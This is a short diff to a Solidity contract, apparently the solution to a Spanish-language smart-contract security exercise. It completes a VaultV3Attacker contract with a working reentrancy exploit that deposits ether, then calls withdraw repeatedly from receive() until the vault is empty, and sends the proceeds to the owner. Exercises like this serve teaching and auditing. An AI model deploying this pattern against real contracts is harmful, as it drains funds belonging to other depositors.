@@ -2,6 +2,7 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/access/Ownable.sol";
+import "hardhat/console.sol";
 
 interface IVaultV3 {
     function deposit() external payable;
@@ -18,9 +19,19 @@ contract VaultV3Attacker is Ownable {
 
     function attack() external payable onlyOwner {
         // COMPLETAR
+        vault.deposit{value: msg.value}();
+        vault.withdraw();
     }
 
     receive() external payable {
         // COMPLETAR
+        if(address(vault).balance>0) {
+            console.log("reentrando");
+            console.log(address(vault).balance);
+            vault.withdraw();
+        } else {
+            console.log("ataque terminado");
+            payable(owner()).transfer(address(this).balance);
+        }
     }
 }
